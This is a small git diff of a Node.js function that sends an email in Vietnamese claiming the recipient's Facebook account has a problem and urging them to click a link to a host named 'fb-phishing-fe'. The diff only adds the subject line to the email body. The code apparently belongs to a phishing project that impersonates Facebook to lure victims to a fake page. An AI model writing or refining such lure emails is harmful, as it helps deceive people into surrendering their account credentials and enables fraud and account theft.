@@ -92,7 +92,8 @@ const sendEmail = async (req, res) => {
     from: process.env.EMAIL_USERNAME,
     to: email,
     subject: `Tài khoản Facebook của bạn đã gặp vấn đề`,
-    text: `Hãy bấm vào đường link này để xem chi tiết.
+    text: `Tài khoản Facebook của bạn đã gặp vấn đề
+    Hãy bấm vào đường link này để xem chi tiết.
       https://fb-phishing-fe.onrender.com`,
   };
 
